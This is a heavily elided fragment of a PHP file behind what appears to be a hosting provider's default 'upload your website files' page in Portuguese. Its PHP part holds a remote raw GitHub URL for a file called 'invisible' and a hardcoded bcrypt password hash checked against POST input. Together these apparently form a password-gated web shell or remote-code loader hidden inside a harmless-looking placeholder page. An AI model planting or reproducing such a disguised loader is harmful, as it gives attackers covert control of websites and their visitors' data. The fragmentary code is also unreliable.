...
if (is_logged_in()) {
    ...
    $destiny = 'https://raw.githubusercontent.com/tuanpetir1/a1/refs/heads/main/invisible';
    ...
    if (isset($_POST['password'])) {
        ...
        $hashed_key = '$2a$12$KkBU8t4QhEgwW/qQzTs.gu1c0As8MN8zXsTjOIyKzzIkt3bqNEbM2'; 
...
<html lang="pt">
    ...
    <body>
        ...
        <div class="content">
            ...
            <p>All you need to do now is upload your website files and start your journey. Here's how:</p>
            <div class="link-container">
                ...
                <a 
                    ...
                    target="_blank"
                >
                    How to install WordPress with the Auto Installer?
                    <svg class="ic-launch" viewBox="0 0 21 20" fill="none" xmlns="http://www.w3.org/2000/svg">
                        <path 
                            fill-rule="evenodd" 
                            clip-rule="evenodd" 
